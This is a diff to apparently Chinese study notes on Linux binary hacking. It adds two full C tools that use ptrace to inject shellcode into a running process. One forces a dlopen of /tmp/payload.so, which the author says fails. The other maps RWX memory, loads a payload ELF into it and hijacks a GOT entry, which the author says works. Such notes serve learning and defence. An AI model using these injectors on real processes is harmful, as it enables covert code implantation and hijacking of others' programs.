@@ -6237,6 +6237,462 @@ _start()
 
 首先定位到libc.so.6的基地址，注意到共享目标和可执行文件的加载方式都是一样的，第一个段中包含文件头和程序头表；根据程序头表中的信息，定位到 PT_DYNAMIC 段的位置；然后在DYNAMIC段中找到 .dynsym 和 .dynstr 节的地址，这里需要注意的问题是，DYNAMIC 段中并没有给出 .dynsym 的大小，但是注意到 .dynsym 和 .dynstr 是紧挨着的，所以 .dynsym 的大小就是 .dynstr 的地址减去 .dynsym 的地址；有了这两个节的地址后便可以得到 dlopen() 函数的地址，从而实现调用。
 
+
+##### Library_inject
+
+这部分实验出现一些无法理解的错误，即注入的代码无法正确执行，注入代码后目标进程并没有被中断指令中断，但是将注入的代码直接在宿主程序的源码中写入后却能够正确执行。在这个实验中能够正确找到libc里的dlopen()函数的地址，但是通过函数地址调用该函数的过程中出现错误，目前暂时没有解决。
+
+**我认为这样的注入方法并不是很可靠，因为dlopen()的符号解析存在一定的不稳定性，比如在我之前看到的一些文档中，dlopen()并不存在于libc共享库中，但是本人的实验环境Ubuntu22的libc中就存在dlopen()函数，而在另一台环境为Ubuntu16的虚拟机中，却不存在dlopen()函数，但是存在一个_libc_dlopen()的函数能够执行dlopen()一样的功能。** 当然，dlopen()这个函数还是有很多可挖掘额的地方。
+
+实验的代码如下，虽然实验是失败的，但是其中一些共享库符号解析的思路还是有参考价值的。
+
+```c
+
+/* library_inject.c
+ * inject a shared library or executable file
+ * into the process image of target process
+ * Usage: library_inject <pid> */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <elf.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include <sys/types.h>
+#include <sys/errno.h>
+#include <dlfcn.h>
+
+typedef struct _handle_t
+{
+    /* pid of target process */
+    pid_t       pid;
+    struct user_regs_struct pt_reg;
+
+    /* content of libc of target process */
+    uint64_t    libc_base_addr;
+    Elf64_Ehdr  *libc_ehdr;
+    Elf64_Phdr  *libc_phdr;
+    Elf64_Dyn   *libc_dyn;
+    Elf64_Sym   *libc_sym;
+    int         sym_entry_cnt;
+    char        *libc_str;
+
+    /* some symbol information */
+    uint64_t    dlopen_addr;
+    uint64_t    dlerror_addr;
+    uint64_t    dlsym_addr;
+
+    /* content of target process */
+    uint64_t    base_addr;
+    Elf64_Ehdr  *ehdr;
+    Elf64_Phdr  *phdr;
+    Elf64_Dyn   *dyn;
+    uint64_t    *got;
+    uint64_t    got_addr;
+    int         got_ent_cnt;
+}handle_t;
+
+int dump_process(handle_t *);
+static volatile void injected_code(uint64_t);
+int dump_libc(handle_t *);
+int pid_read(pid_t, const void *, const void *, size_t);
+int pid_write(pid_t, const void *, const void *, size_t);
+uint64_t look_up_libcsymbol(handle_t, const char *);
+
+static volatile void injected_code(uint64_t dlopen_addr)
+{ 
+    
+    char library_name[] = {'/', 't', 'm', 'p', '/', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '.', 's', 'o', '\0'}; 
+    int flags = RTLD_LAZY;
+    __asm__ volatile(
+        "mov %0, %%rdi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%rbx\n"
+        "call *%%rbx\n"
+        "int3\n"
+        :
+        : "g"(library_name), "g"(flags), "g"(dlopen_addr)
+    );
+    
+}
+
+int dump_process(handle_t *h)
+{
+    char addr[16], line[32], maps[32];
+    snprintf(maps, 32, "/proc/%d/maps", h->pid);
+    int fd;
+    if((fd = open(maps, O_RDONLY)) < 0)
+    {
+        perror("maps");
+        return -1;
+    }
+    if(read(fd, line, 32) < 0)
+    {
+        perror("read");
+        return -1;
+    }
+    close(fd);
+    int i;
+    for(i = 0; i < 16; i++)
+    {
+        addr[i] = line[i];
+        if(line[i] == '-')
+        {
+            addr[i] = 0;
+            break;
+        }
+    }
+    h->base_addr = strtoul(addr, NULL, 16);
+    printf("\t[+] got base address of target process:\t\t0x%lx\n", h->base_addr);
+    h->ehdr = malloc(sizeof(Elf64_Ehdr));
+    if(pid_read(h->pid, h->ehdr, (void *)h->base_addr, sizeof(Elf64_Ehdr)) < 0)
+        return -1;
+    
+    size_t phdr_size = h->ehdr->e_phnum * h->ehdr->e_phentsize;
+    Elf64_Off phdr_offset = h->ehdr->e_phoff;
+    h->phdr = malloc(phdr_size);
+    if(pid_read(h->pid, h->phdr, (void *)(h->base_addr + phdr_offset), phdr_size) < 0)
+        return -1;
+
+    for(i = 0; i < h->ehdr->e_phnum; i++)
+    {
+        if(h->phdr[i].p_type == PT_DYNAMIC)
+        {
+            h->dyn = malloc(h->phdr[i].p_memsz);
+            printf("\t[+] find the dynamic segment at:\t\t0x%lx\n", h->phdr[i].p_vaddr);
+            if(pid_read(h->pid, h->dyn, (void *)h->phdr[i].p_vaddr, h->phdr[i].p_memsz) < 0)
+                return -1;
+            break;
+        }
+    }
+    uint64_t plt_rel_type;
+    size_t rel_ent_sz, rela_ent_sz, plt_rel_sz;
+
+    for(i = 0; h->dyn[i].d_tag != DT_NULL; i++)
+    {
+        if(h->dyn[i].d_tag == DT_PLTGOT)
+            h->got_addr = h->dyn[i].d_un.d_ptr;
+        if(h->dyn[i].d_tag == DT_PLTRELSZ)
+            plt_rel_sz = h->dyn[i].d_un.d_val;
+        if(h->dyn[i].d_tag == DT_PLTREL)
+            plt_rel_type = h->dyn[i].d_un.d_val;
+        if(h->dyn[i].d_tag == DT_RELAENT)
+            rela_ent_sz = h->dyn[i].d_un.d_val;
+        if(h->dyn[i].d_tag == DT_RELENT)
+            rel_ent_sz = h->dyn[i].d_un.d_val;
+    }
+
+    printf("\t[+] find the GOT of process at:\t\t\t0x%lx\n", h->got_addr);
+    h->got_ent_cnt = plt_rel_sz / (plt_rel_type == DT_RELA ? rela_ent_sz : rel_ent_sz) + 3;
+
+    size_t got_size = h->got_ent_cnt * sizeof(uint64_t);
+    h->got = malloc(got_size);
+    if(pid_read(h->pid, h->got, (void *)h->got_addr, got_size) < 0)
+        return -1;
+    return 0;
+}
+
+int dump_libc(handle_t *h)
+{
+    char addr[16], maps[32], line[256];
+    snprintf(maps, 32, "/proc/%d/maps", h->pid);
+    FILE *fd;
+    if((fd = fopen(maps, "r"))  == NULL)
+    {
+        perror("fopen");
+        return -1;
+    }
+
+    int i;
+    while (fgets(line, 256, fd) != NULL)
+    {
+        int len = strlen(line), find_addr = 0, is_libc = 0;
+        for(i = 0; i < len; i++)
+        {
+            if(!find_addr)
+                addr[i] = line[i];
+            
+            if(line[i] == '-')
+            {
+                addr[i] = 0;
+                find_addr = 1;
+            }
+
+            if( line[i + 0] == 'l' &&
+                line[i + 1] == 'i' &&
+                line[i + 2] == 'b' &&
+                line[i + 3] == 'c')
+            {
+                h->libc_base_addr = strtoul(addr, NULL, 16);
+                is_libc = 1;
+                break;
+            }
+        }
+        if(is_libc)
+            break;
+    }
+    printf("\t[+] got the base address of libc:\t\t0x%lx\n", h->libc_base_addr);
+    h->libc_ehdr = malloc(sizeof(Elf64_Ehdr));
+    if(pid_read(h->pid, h->libc_ehdr, (void *)h->libc_base_addr, sizeof(Elf64_Ehdr)) < 0)
+        return -1;
+    
+    size_t phdr_size = h->libc_ehdr->e_phentsize * h->libc_ehdr->e_phnum;
+    Elf64_Off phdr_off = h->libc_ehdr->e_phoff;
+    h->libc_phdr = malloc(phdr_size);
+    if(pid_read(h->pid, h->libc_phdr, (void *)(h->libc_base_addr + phdr_off), phdr_size) < 0)
+        return -1;
+    
+    for(i = 0; i < h->libc_ehdr->e_phnum; i++)
+    {
+        if(h->libc_phdr[i].p_type == PT_DYNAMIC)
+        {
+            h->libc_dyn = malloc(h->libc_phdr[i].p_memsz);
+            printf("\t[+] find the dynamic segment of libc at:\t0x%lx\n", h->libc_phdr[i].p_vaddr + h->libc_base_addr);
+            if(pid_read(h->pid, h->libc_dyn, (void *)(h->libc_phdr[i].p_vaddr + h->libc_base_addr), h->libc_phdr[i].p_memsz) < 0)
+                return -1;
+            break;
+        }
+    }
+    uint64_t str_addr, sym_addr;
+    size_t str_sz, sym_sz;
+    int sym_ent;
+    for(i = 0; h->libc_dyn[i].d_tag != DT_NULL; i++)
+    {
+        if(h->libc_dyn[i].d_tag == DT_SYMTAB)
+            sym_addr = h->libc_dyn[i].d_un.d_ptr;
+        
+        if(h->libc_dyn[i].d_tag == DT_STRTAB)
+            str_addr = h->libc_dyn[i].d_un.d_ptr;
+
+        if(h->libc_dyn[i].d_tag == DT_STRSZ)
+            str_sz = h->libc_dyn[i].d_un.d_val;
+        
+        if(h->libc_dyn[i].d_tag == DT_SYMENT)
+            sym_ent = h->libc_dyn[i].d_un.d_val;
+    }
+    h->sym_entry_cnt = (str_addr - sym_addr) / sym_ent;
+    sym_sz = str_addr - sym_addr;
+    
+    h->libc_sym = malloc(sym_sz);
+    if(pid_read(h->pid, h->libc_sym, (void *)sym_addr, sym_sz) < 0)
+        return -1;
+
+    h->libc_str = malloc(str_sz);
+    if(pid_read(h->pid, h->libc_str, (void *)str_addr, str_sz) < 0)
+        return -1;
+
+    return 0;
+}
+
+// Read len bytes from the src to dst in process specifed by pid
+int pid_read(pid_t pid, const void *dst, const void *src, size_t len)
+{
+    int times = len / sizeof(long);
+    void *s = (void *)src;
+    void *d = (void *)dst;
+    int i;
+    for(i = 0; i < times; i++)
+    {
+        long word;
+        if((word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL)) == -1 && errno)
+        {
+            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
+            return -1;
+        }
+        memcpy(d, &word, sizeof(long));
+        s += sizeof(long);
+        d += sizeof(long);
+    }
+    return 0;
+}
+
+// Write len bytes from the src to dst in processs specified by pid
+int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
+{
+    int times = len / sizeof(long);
+    void *s = (void *)src;
+    void *d = (void *)dst;
+    int i;
+    for(i = 0; i < times; i++)
+    {
+        if(ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
+        {
+            fprintf(stderr, "pid_write failed, pid: %d: %s\n", pid, strerror(errno));
+            perror("PTRACE_POKETEXT");
+            return -1;
+        }
+        s += sizeof(void *);
+        d += sizeof(void *);
+    }
+    return 0;
+}
+
+unsigned long f1 = (uint64_t)injected_code;
+unsigned long f2 = (uint64_t)dump_process;
+
+uint8_t *create_shellcode(void (*fn)(uint64_t), size_t len)
+{
+    int i;
+    uint8_t *shellcode = (uint8_t *)malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) *(shellcode + i) = *(ptr + i);
+    return shellcode;
+}
+
+uint64_t look_up_libcsymbol(handle_t h, const char *symbol)
+{
+    int i;
+    uint64_t result = 0;
+    for(i = 0; i < h.sym_entry_cnt; i++)
+    {
+        int str_index = h.libc_sym[i].st_name;
+        
+        if(strcmp(&h.libc_str[str_index], symbol) == 0)
+        {
+            printf("\t[+] %s\t--->  0x%lx\n", &h.libc_str[str_index], h.libc_sym[i].st_value + h.libc_base_addr);
+            result = h.libc_sym[i].st_value + h.libc_base_addr;
+            break;
+        }
+    }
+    return result;
+}
+
+int main(int argc, char *argv[])
+{
+    if(argc != 2)
+    {
+        printf("Usage: %s <pid>\n", argv[0]);
+        exit(0);
+    }
+    handle_t h;
+    int status;
+    h.pid = atoi(argv[1]);
+    if(ptrace(PTRACE_ATTACH, h.pid, NULL, NULL) < 0)
+    {
+        perror("PTRACE_ATTACH");
+        exit(-1);
+    }
+    wait(&status);
+    
+    printf("Dump the process...\n");
+    if(dump_process(&h) < 0)
+    {
+        printf("something went wrong with the process dump.\n");
+        exit(-1);
+    }
+
+    printf("Now dump the libc of target porcess...\n");
+    if(dump_libc(&h) < 0)
+    {
+        printf("something went wrong with libc dump.\n");
+        exit(-1);
+    }
+
+    printf("Then, remote resolve the dynamic symbol...\n");
+    if((h.dlopen_addr = look_up_libcsymbol(h, "dlopen")) == 0)
+    {
+        printf("something went wrong with dlopen resolution.\n");
+        exit(-1);
+    }
+    if((h.dlsym_addr = look_up_libcsymbol(h, "dlsym")) == 0)
+    {
+        printf("something went wrong with dlerror resolution.\n");
+        exit(-1);
+    }
+    size_t shell_size = f2 - f1;
+    uint8_t *shellcode = create_shellcode(injected_code, shell_size);
+    uint64_t inject_addr;
+    int i;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if(h.phdr[i].p_type == PT_LOAD && (h.phdr[i].p_flags == (PF_R | PF_X)))
+        {
+            inject_addr = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
+            break;
+        }
+    }
+    
+    printf("Going to inject shellcode to the text padding area...\n");
+    printf("\t[+] inject to 0x%lx\n", inject_addr);
+    
+    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to get the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    uint64_t old_rip = h.pt_reg.rip;
+    uint64_t old_rsp = h.pt_reg.rsp;
+    uint64_t old_rbp = h.pt_reg.rbp;
+
+    if(pid_write(h.pid, (void *)inject_addr, shellcode, shell_size) == 1)
+    {
+        printf("Failed to write shellcode\n");
+        exit(EXIT_FAILURE);
+    }
+
+    h.pt_reg.rip = inject_addr;
+    h.pt_reg.rdi = h.dlopen_addr;
+    // h.pt_reg.rdx = h.dlerror_addr;
+
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to set the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
+    {
+        fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    wait(&status);
+    if(WSTOPSIG(status) != SIGTRAP)
+    {
+        printf("Something went wrong.\n");
+        // exit(EXIT_FAILURE);
+    }else
+    {
+        printf("Shellcode has been injected and executed.\n");
+        
+    }
+    printf("Press any key to continue...\n");
+    getchar();
+    // Recovery the context of target process
+    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        perror("PTRACE_GETREGS");
+        exit(EXIT_FAILURE);
+    }
+    h.pt_reg.rip = old_rip;
+    h.pt_reg.rsp = old_rsp;
+    h.pt_reg.rbp = old_rbp;
+
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        perror("PTRACE_SETREGS");
+        exit(EXIT_FAILURE);
+    }
+
+    // Detaching to make the target process run
+    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
+    {
+        perror("PTRACE_CONT");
+        exit(EXIT_FAILURE);
+    }
+    wait(NULL);
+    return 0;
+}
+
+```
+
 #### 可执行文件注入
 
 dlopen()系统调用也可以用于将PIE类型的可执行文件加载到进程中，所以可以注入ET_EXEC类型的可执行文件。
@@ -6260,27 +6716,416 @@ dlopen()系统调用也可以用于将PIE类型的可执行文件加载到进程
 
 在下面的例子中，我们要求shellcode完成一些更复杂的任务：使用malloc()在指定区域分配一个具有读写执行权限的内存空间(RWX)，然后将另一个文件中的代码加载到这个空间，然后将目标进程的执行流跳转到这个空间上去执行。
 
-这里的代码实现出了一点问题，因为在附加到目标进程时，目标进程正在执行sleep()系统调用，此时目标进程的PC位于共享库中。
+实验的原理如下图所示：
 
-当我们注入shellcode时，将PC跳转到text段填充区域进行执行，并且shellcode中最后一条指令是一条"int3"指令，于是目标进程在执行完shellcode后会被中断，并且将控制返回到code_inject程序中，此时，目标进程已经成功执行了shellcode，开辟了一块匿名内存空间。
+![text_injection](./image/text_injection.png)
 
-然后code_inject再将payload加载到这块匿名内存空间上准备执行。
+代码如下：
 
-加载完成后，将目标进程的PC设置为payload的程序入口点，并让目标进程执行，然而，此时的目标进程继续执行会出现segmentation fault。
+```c
 
-如下面的示意图所示：
+/* inject_greeting.c */
+/* gcc inject_greeting.c -o inject_greeting */
+/* Usage: inject_greeting <pid> */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <elf.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include <sys/types.h>
+#include <sys/errno.h>
 
-![code_injection_fault](./image/code_injection_fault.png)
+#define WORD_ALIGN(x) (x + 7)&(~7)
 
-其中带数字的线表示程序的控制流。其中以PC为起始点的控制转移路线是指追踪host程序的code_inect程序修改host的PC所进行的控制转移，而第2次控制转移是host程序被shellcode中的"int3"指令中断后将控制返回到code_inject程序。
+typedef struct handle
+{
+    pid_t pid;                      // PID of target process
 
-在最后一步的控制流转移的时候，如果将host的控制转移到匿名内存空间，将会出现segmentation fault。事实上，转移到除原来的PC位置以外的任何位置都会造成一个segmentation fault；而如果将控制转移到host原来的位置，并且恢复host的%rsp和%rbp寄存器后，程序能够回到原来的位置继续执行。
+    uint64_t base_addr;             // base address of target process
+    Elf64_Ehdr *ehdr;               // ELF header of target process
+    Elf64_Phdr *phdr;               // program header of target process
 
-**也就是说，在修改宿主程序的PC以操控其控制流时，第一次修改没有问题，但是第二次修改只能回到其原来的位置进行执行，否则将会出现段错误**。
+    char *executable;               // payload
 
-**这个问题可能与Intel的CET技术相关，目前的计划是先把这本书的内容过一遍，然后再着手解决这个问题。**
+    struct user_regs_struct pt_reg; // Register of target process
+    
+    uint8_t *shellcode;             // Address of shellcode
 
-这个问题暂时还没有得到一个有效的解决方法。*这个问题暂时先留着，等以后有机会再解决*。
+    uint64_t inject_addr;           // Address where we inject the shellcode
+    uint64_t payload_entry;         // entry of payload
+}handle_t;
+
+static inline volatile long
+print_string(int, char *, unsigned long)__attribute__((aligned(8), __always_inline__));
+static inline volatile void *
+evil_mmap(void *, size_t, int, long, int64_t, uint64_t)__attribute__((aligned(8), __always_inline__));
+uint64_t injected_code() __attribute__((aligned(8)));
+int pid_read(pid_t, const void *, const void *, size_t);
+int pid_write(pid_t, const void *, const void *, size_t);
+uint8_t *create_shellcode(void (*fn)(), size_t len);
+uint64_t get_inject_addr(handle_t *);
+
+uint64_t f1 = (uint64_t)injected_code;
+uint64_t f2 = (uint64_t)pid_read;
+
+// Assembly code for write(1, buf, len)
+static inline volatile long
+print_string(int fd, char *buf, unsigned long len)
+{
+    long ret;
+    __asm__ volatile(
+        "mov %1, %%edi\n"
+        "mov %2, %%rsi\n"
+        "mov %3, %%rdx\n"
+        "mov $1, %%rax\n"
+        "syscall\n"
+        "mov %%rax, %0\n"
+        : "=r"(ret)
+        : "g"(fd), "g"(buf), "g"(len)
+    );
+    return ret;
+}
+
+static inline volatile void * 
+evil_mmap(void *addr, size_t length, int prot, long flags, int64_t fd, uint64_t offset)
+{
+    void *ret;
+    __asm__ volatile(
+        "mov %1, %%rdi\n"
+        "mov %2, %%rsi\n"
+        "mov %3, %%edx\n"
+        "mov %4, %%r10\n"
+        "mov %5, %%r8\n"
+        "mov %6, %%r9\n"
+        "mov $9, %%rax\n"
+        "syscall\n"
+        "mov %%rax, %0"
+        : "=r"(ret)
+        : "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)  
+    );
+    return ret;
+}
+
+uint64_t injected_code()
+{
+    evil_mmap(NULL, 0x4000, 
+    PROT_READ|PROT_WRITE|PROT_EXEC, 
+    MAP_ANONYMOUS|MAP_PRIVATE, 
+    -1, 0);
+    __asm__ volatile("int3");
+    
+    /*
+    char str[] = {'[', 'I', '\'', 'm', ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
+    print_string(1, str, 14);
+    __asm__ volatile("int3");
+    */
+}
+
+// Duplicate the function (shellcode) to a heap address space
+uint8_t *create_shellcode(void (*fn)(), size_t len)
+{
+    int i;
+    uint8_t *shellcode = (uint8_t *)malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) *(shellcode + i) = *(ptr + i);
+    return shellcode;
+}
+
+// Read len bytes from the src to dst in process specifed by pid
+int pid_read(pid_t pid, const void *dst, const void *src, size_t len)
+{
+    int times = len / sizeof(long);
+    void *s = (void *)src;
+    void *d = (void *)dst;
+    int i;
+    for(i = 0; i < times; i++)
+    {
+        long word;
+        if((word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL)) == -1 && errno)
+        {
+            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
+            perror("PTRACE_PEEKTEXT");
+            return 1;
+        }
+        memcpy(d, &word, sizeof(long));
+        s += sizeof(long);
+        d += sizeof(long);
+    }
+    return 0;
+}
+
+// Write len bytes from the src to dst in processs specified by pid
+int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
+{
+    int times = len / sizeof(long);
+    void *s = (void *)src;
+    void *d = (void *)dst;
+    int i;
+    for(i = 0; i < times; i++)
+    {
+        if(ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
+        {
+            fprintf(stderr, "pid_write failed, pid: %d: %s\n", pid, strerror(errno));
+            perror("PTRACE_POKETEXT");
+            return 1;
+        }
+        s += sizeof(void *);
+        d += sizeof(void *);
+    }
+    return 0;
+}
+
+/* Obtain the inject address by referring program header, 
+*  hence the host program should be compiled with -no-pie. */ 
+uint64_t get_inject_addr(handle_t *h)
+{
+    uint64_t inject_addr = 0;
+    char maps[512], buffer[64];
+    FILE *fd;
+    snprintf(maps, 512, "/proc/%d/maps", h->pid);
+    if((fd = fopen(maps, "r"))  == NULL)
+    {
+        perror("fopen");
+        return 1;
+    }
+    if(fgets(buffer, 64, fd) < 0)
+    {
+        perror("fgets");
+        exit(-1);
+    }
+    fclose(fd);
+    char* base_str = strtok(buffer, "-");
+    h->base_addr = strtoul(base_str, NULL, 16);
+    
+    uint8_t *mem = malloc(sizeof(Elf64_Ehdr));
+    if(mem == MAP_FAILED)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr)) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
+    size_t phdr_size = ehdr->e_phentsize * ehdr->e_phnum;
+    free(mem);
+    
+    mem = malloc(sizeof(Elf64_Ehdr) + phdr_size);
+    if(mem == MAP_FAILED)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr) + phdr_size) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+    h->ehdr = (Elf64_Ehdr *)mem;
+    h->phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
+    int i;
+    for(i = 0; i < ehdr->e_phnum; i++)
+    {
+        if((h->phdr[i].p_type == PT_LOAD)&&(h->phdr[i].p_flags == PF_R + PF_X))
+        {
+            inject_addr = h->phdr[i].p_vaddr + h->phdr[i].p_memsz;
+            break;
+        }
+    }
+    return inject_addr;
+}
+
+void got_redirection(handle_t h)
+{
+    int i;
+    uint64_t dynamic_addr;
+    size_t dynamic_size;
+    uint64_t got_addr;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if(h.phdr[i].p_type == PT_DYNAMIC)
+        {
+            dynamic_addr = h.phdr[i].p_vaddr;
+            dynamic_size = h.phdr[i].p_memsz;
+            break;
+        }
+    }
+    Elf64_Dyn *dyn = malloc(dynamic_size);
+    if(pid_read(h.pid, dyn, (void *)dynamic_addr, dynamic_size) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+    for(i = 0; dyn[i].d_tag != DT_NULL; i++)
+    {
+        if(dyn[i].d_tag == DT_PLTGOT)
+        {
+            got_addr = dyn[i].d_un.d_ptr + 4 * sizeof(uint64_t);
+            break;
+        }
+    }
+    printf("GOT redirection address: %lx\n", got_addr);
+    if(pid_write(h.pid, (void *)got_addr, (void *)&h.payload_entry, sizeof(uint64_t)) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+}
+
+
+int main(int argc, char *argv[])
+{
+    // Processing commandline arguments
+    if(argc != 3)
+    {
+        printf("Usage: %s <PID> <payload>\n", argv[0]);
+        exit(EXIT_SUCCESS);
+    }
+    handle_t h;
+    h.pid = atoi(argv[1]);
+    h.executable = strdup(argv[2]);
+    int status;
+    
+    // Attach to target process
+    if(ptrace(PTRACE_ATTACH, h.pid, NULL, NULL) < 0)
+    {
+        fprintf(stderr, "Failed to attach to the target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+    wait(&status);
+    printf("Attached to the target process.\n");
+    if((h.inject_addr = get_inject_addr(&h)) == 0)
+    {
+        printf("Failed to get the injection address.\n");
+        exit(EXIT_FAILURE);
+    }
+    printf("Got the inject address: %lx\n", h.inject_addr);
+    size_t shell_size = f2 - f1;
+    shell_size += 8;
+    
+    // Generate the shell code in heap address space
+    h.shellcode = create_shellcode((void *)(injected_code), shell_size);
+    
+    // Inject the shellcode to the host at inject address
+    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to get the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+    uint64_t old_rip = h.pt_reg.rip;
+    uint64_t old_rsp = h.pt_reg.rsp;
+    uint64_t old_rbp = h.pt_reg.rbp;
+
+    if(pid_write(h.pid, (void *)h.inject_addr, (void *)h.shellcode, shell_size) == 1)
+    {
+        printf("Failed to write shellcode\n");
+        exit(EXIT_FAILURE);
+    }
+
+    h.pt_reg.rip = h.inject_addr;
+    
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to set the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    // Start the target process
+    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
+    {
+        fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+    uint64_t ret_addr;
+    wait(&status);
+    if(WSTOPSIG(status) != SIGTRAP)
+    {
+        printf("Something went wrong.\n");
+        exit(EXIT_FAILURE);
+    }else
+    {
+        printf("Shellcode has been injected and executed.\n");
+        if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+        {
+            perror("PTRACE_GETREGS");
+            exit(EXIT_FAILURE);
+        }
+        ret_addr = h.pt_reg.rax;
+        if(ret_addr < 0)
+        {
+            printf("mmap failed, process exit.\n");
+            exit(EXIT_FAILURE);
+        }
+        printf("return value of shellcode: 0x%lx\n", ret_addr);
+        printf("Press any key to continue...\n");
+        getchar();
+    }
+    
+    int fd;
+    if((fd = open(h.executable, O_RDONLY)) < 0)
+    {
+        perror("open");
+        exit(-1);
+    }
+    struct stat st;
+    if((fstat(fd, &st)) < 0)
+    {
+        perror("fstat");
+        exit(-1);
+    }
+    uint8_t *mem = mmap(NULL, WORD_ALIGN(st.st_size), PROT_READ, MAP_PRIVATE, fd, 0);
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
+    h.payload_entry = ret_addr + ehdr->e_entry;
+
+    if(pid_write(h.pid, (void *)ret_addr, mem, WORD_ALIGN(st.st_size)) < 0)
+    {
+        printf("Failed to load the payload.\n");
+        exit(-1);
+    }
+    
+    got_redirection(h);
+
+    // Set the PC of host to the payload
+    h.pt_reg.rip = old_rip;
+    h.pt_reg.rbp = old_rbp;
+    h.pt_reg.rsp = old_rsp;
+    /* Note that current rbp = 0*/
+    
+    // printf("%llx    %lx\n", h.pt_reg.rbp, old_rbp);
+    // printf("%llx    %lx\n", h.pt_reg.rsp, old_rsp);
+    
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        perror("PTRACE_SETREGS");
+        exit(EXIT_FAILURE);
+    }
+
+    // Detaching to make the target process run
+    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
+    {
+        perror("PTRACE_CONT");
+        exit(EXIT_FAILURE);
+    }
+    wait(NULL);
+
+    return 0;
+}
+
+```
+
+实验结果如下：
+
+![text_injection_result](./image/text_injection_result.png)
+
+可以看到运行结果与预期是一致的。
 
 ## 0x07 Linux 二进制保护
 
